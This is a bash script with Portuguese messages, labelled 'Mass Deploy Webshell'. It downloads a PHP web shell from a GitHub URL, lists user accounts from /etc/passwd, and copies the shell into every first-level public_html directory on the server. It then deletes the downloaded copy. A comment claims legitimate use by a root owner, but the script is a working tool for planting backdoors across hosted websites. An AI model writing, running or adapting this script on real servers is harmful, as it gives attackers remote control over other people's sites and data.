#!/bin/bash
# Mass Deploy - Auto download + copy to all public_html
# Uso legítimo apenas (dono do servidor com root)

URL="https://raw.githubusercontent.com/lei-sudo/Leisec-Webshell/refs/heads/main/leisec.php"
FILENAME="leisec.php"
UHOME="/home"

echo "~~~~~ Mass Deploy Webshell ~~~~~"
echo "Download automático de: $URL"

# Baixa o ficheiro
wget -q -O "$FILENAME" "$URL"

if [ ! -f "$FILENAME" ]; then
    echo "Erro: Falha ao baixar o ficheiro da URL."
    exit 1
fi

echo "Ficheiro baixado com sucesso: $FILENAME"
echo "Copiando para todos os /public_html (subdiretórios nível 1)..."

_USERS=$(awk -F':' '{ if ($3 >= 500) print $1 }' /etc/passwd)

for u in $_USERS; do
    _dir="${UHOME}/${u}/public_html"
    if [ -d "$_dir" ]; then
        find "$_dir" -maxdepth 1 -type d | while read -r target_dir; do
            cp -f "$FILENAME" "$target_dir/" 2>/dev/null
            if [ -f "$target_dir/$FILENAME" ]; then
                echo "[+] Sucesso -> $target_dir/$FILENAME"
            fi
        done
    fi
done

echo ""
echo "Concluído! O ficheiro $FILENAME foi copiado para todos os public_html."
rm -f "$FILENAME"   # remove o original após copiar
